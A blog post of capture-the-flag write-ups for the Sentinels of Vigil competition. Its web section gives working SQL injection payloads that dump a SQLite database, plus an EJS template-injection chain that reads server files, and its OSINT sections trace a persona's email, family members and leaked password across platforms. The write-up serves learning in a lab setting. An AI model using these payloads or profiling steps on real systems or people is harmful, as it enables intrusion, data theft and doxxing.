---
layout: post
title:  "sentinels chals writeups"
date:   2025-08-29 09:29:20 +0700
categories: jekyll update
usemathjax: true
---
## link
https://sentinelsofvigil.ctfd.io/team

## > Tiers of Naughtiness (Web, 150)

upon following the challenge instructions and entering 'playitprobro' into the url parameter, we are given the output

`NAUGHTY: playitprobro is in tier -> 3`

it can be confirmed that this challenge is sqli by entering a single `'` quote in the url parameter, yielding an SQL Error: unrecognized token: "'''"

with sqli, we start by identifying the number of columns that is reflected in output, with the payload `sql ?name=' UNION SELECT NULL--`, which yields another SQL Error: SELECTs to the left and right of UNION do not have the same number of result columns

we systematically increase the number of NULL's in the payload until the app stops throwing errors.

payload | result
?name=' UNION SELECT NULL, NULL, NULL-- | NAUGHTY: None is in tier -> None

the database has accepted our offering of three NULLs and we can proceed forth. now, we determine which columns are visible in the output with payload `?name=' UNION SELECT 'AAA','BBB','CCC'--+`, producing output

`NAUGHTY: BBB is in tier -> CCC`

i attempt to list the names of tables using the payload `?name=' UNION SELECT NULL,database(),version()--+` but this threw an SQL Error: no such function: database.

i then reattempt using a payload designed for sqlite `?name=' UNION SELECT NULL,name,type FROM sqlite_master WHERE type='table'--+`, which produces output 

`NAUGHTY: tier_one_secret_123081223_autonau is in tier -> table`

we found something tasty. use the payload `?name=' UNION SELECT NULL,name,type FROM pragma_table_info('tier_one_secret_123081223_autonau')--+` to read its columns

`NAUGHTY: hahah_hi_user is in tier -> TEXT`

now, directly dump the flag: `?name=' UNION SELECT NULL,hahah_hi_user,NULL FROM tier_one_secret_123081223_autonau--+`. this produces the output:

`NAUGHTY: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( } is in tier -> None`

flag: `SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( }`

## > Fuzz (Web, 150)
https://sentinelsofvigil-fuzz.chals.io

web fuzzing is testing various inputs for a web app and hoping to induce unwanted behaviour, basically just poke it until it screams

in this website, we are provided a text input. upon submitting the input, the app reflects the input.

my first instinct was using the payload `javascript <script>alert(1337)</script>`, which successfully reflected an alert popup. this suggests XSS but nothing much can be done with that alone

using the payload `sql ' OR 1=1;--` or similar simply reflects the input as is with no errors thrown, suggesting no sqli vulnerability

next i attempted ssti using the jinja2 payload `jinja2{{7*7}}` but the input was again, simply reflected

i then did some googling and found the payload 

```
{{<%[%'"}}%\.
``` 

on https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/, which managed to throw an error, 'Error: Could not find matching close tag for "<%".'

bingo. according to chatgpt this error comes from EJS (embedded javascript)

the payload `<%= require('fs').readdirSync('.') %>` yields an error
'ReferenceError: ejs:1 >> 1 Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'

it looks like `require` is off limits... directly...

this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'

we want to read flag.txt, this can be done using the payload `<%= this.constructor.constructor("return process.mainModule.require('fs').readFileSync('flag.txt', 'utf8')")() %>`

with that, we obtain the flag, `SENTI{n0t_s0_r4nd0m_1npu7}`

## > Convo (OSINT, 350)
our objective is to uncover the location that the user is staying at

our clues:
- good view from the roof
- captivating city lights
- uniquely shaped roof
- expensive to stay at
- a two hour drive from Muar
- near somewhere with over 100 haute coutre pieces (i have no idea what this refers to)

using common sense, we can deduce that said location is singapore's marina bay sands

flag: `SENTI{Marina_Bay_Sands} (probably, can't double check)`

## > Fisch (OSINT, 150)
we are given a roblox screenshot of an npc.

we can visit the fisch fandom wiki and search up the Category for NPCs.

upon looking around, the NPC's likeness can be found under Islands/Snowcap Island, named Wilson.

by going to Wilson's wiki page, we can find the coordinates to the missing item:  X: 2880, Y: 138, Z: 2723.

flag: `SENTI{2880,138,2723}`

## > Work 1 (OSINT, 200)
we are provided the image of someone's brawl stars account

upon stealing my brawl stars addict friend's phone, we can track down their profile by sending them a friend request. within the profile is a link to the employee's twitter/X: @nomo reb rawl

a photo posted on the employee's twitter shows their github username: C-employee-number-one

visiting their profile on github.com, we can identify the boss' github account, 'boss-of-slacker'. we can check out their commit history. by entering .patch behind the commit link, we can view the commit's details, and find the boss' email: 'bigbosschan123@gmail.com'.

flag: `SENTI{bigbosschan123@gmail.com}`

## > Work 3 (OSINT, 200)
a post on the employee's twitter suggests the existence of a reddit account. 
another post suggests that they like to replace the spaces in their username with underscores, which is the reddit username format.
therefore, their username should be u/nomo_reb_rawl

by looking up their user on reddit, we can find a post on r/pcmasterrace where they mention the pc specs that they want to buy in a link to pcpartpicker.com.

from this, it can be found that the processor they want is the AMD Ryzen 7 7800X3D 4.2 GHz 8-Core Processor.

flag: `SENTI{AMD Ryzen 7 7800X3D}`

## > Work 4 (OSINT, 200)
a post on the boss' twitter suggests that the boss has an instagram. 

first we attempted to look up the boss' instagram via their email, but we didnt find anything meaningful

then we realised that if the boss' twitter account was called 'boss_work_acc', the boss' personal instagram account would be named in a similar fashion.

using this knowledge, we identified the boss' instagram account at the username 'boss_family_acc'

and we can identify his family members Zhilin (age 27), Linzong (age 11), Meilin (age 7)"

flag: `SENTI{Meilin_Linzong_Zhilin}`

## > Work 5 (OSINT, 250)
the employee 'pasted' their password somewhere.

this leads to the implication that they used a pastebin web service, such as pastebin.com

searching up the username NOMOREBRAWL on pastebin, we can find the employee's password, 'wasitacaroracatisaw'

flag: `SENTI{wasitacaroracatisaw}`

## > i hate gp (Crypto, 100)
we are given a text file of strings of i_hategp.

each character in each i_hategp can vary. the letters can be upper or lower, while the underscore can be replaced with a space ( ). since the characters are grouped in 8s and the characters can have two variations each, it can be inferred that this cipher is binary. 

through trial and error, the binary conversion can be inferred through two rules
if the second character is an underscore, the bit is 1, if it is a space then the bit is 0
if any letter is uppercase the bit is 1, otherwise the bit is 0

by putting it into chatgpt and telling it the rules, we can uncover the flag.

flag: `SENTI{I_L0v3_GP!1!}`

## > Nonsense (Crypto, 150)
we are given a very suspicious looking string of emojis, 🥰😆🙂😘🤣{😚😂😛😁🤣😁😛🙃😗😁🙃😘😂🤣🥰} which obviously resembles a flag format.

my first thought was that these must be Unicode numbers mod 26, because surely the first five would map to SENTI (it didnt)

a friend then figured out that the emojis correspond to the first 26 emojis on a phone keypad, meaning each emoji = a letter A–Z.

`23, 8, 25, 4, 9, 4, 25, 15, 21, 4, 15, 20, 8, 9, 19`

which translates to 

`W H Y D I D Y O U D O T H I S`

flag: `SENTI{WHYDIDYOUDOTHIS}`

## > Soundcheck (Forensics, 150)

we are presented with a zip full of .wav audio files.

upon taking a look at the contents, i sort the contents by file size, and one file stands out as larger due to its 3789kb file size as compared to the other .wav's 173 kb.

upon listening to said .wav, the audio sounds very reminiscent of morse code.

placing the audio into a morse decoder yields the flag.

flag: `SENTI{BBEEEBEEPBOOPBEEEEEEPBOOPBOPBOPBOPBBOPBOP}`

